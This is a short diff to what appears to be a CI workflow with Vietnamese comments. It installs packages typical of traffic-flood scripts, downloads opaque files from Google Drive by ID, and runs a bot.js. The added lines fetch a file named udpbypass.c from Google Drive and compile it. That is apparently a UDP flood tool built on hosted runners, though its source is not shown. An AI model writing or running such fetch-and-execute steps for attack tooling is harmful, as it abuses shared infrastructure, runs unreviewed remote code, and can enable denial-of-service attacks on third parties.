@@ -58,6 +58,8 @@ jobs:
           npm install cluster colors colorama axios crypto discord.js gradient-string user-agents header-generator
           gdown 1W-q3LSgM6oE14Fd_rrWVwRUmqxgChdMZ
           gdown 1z0VINnYv93dXpwfsN524oIDugy1gaX8A
+          gdown 'https://drive.google.com/uc?id=1MuaBraso20I73ixepu6SQWDq0GMnlU05' -O udpbypass.c
+          gcc udpbypass.c -o udpbypass
           # Tải file bot.js
           gdown 18ScTR9BelCCt_qJ0S6lzr-t_lFVNZ_ED
           # Chạy node bot.js
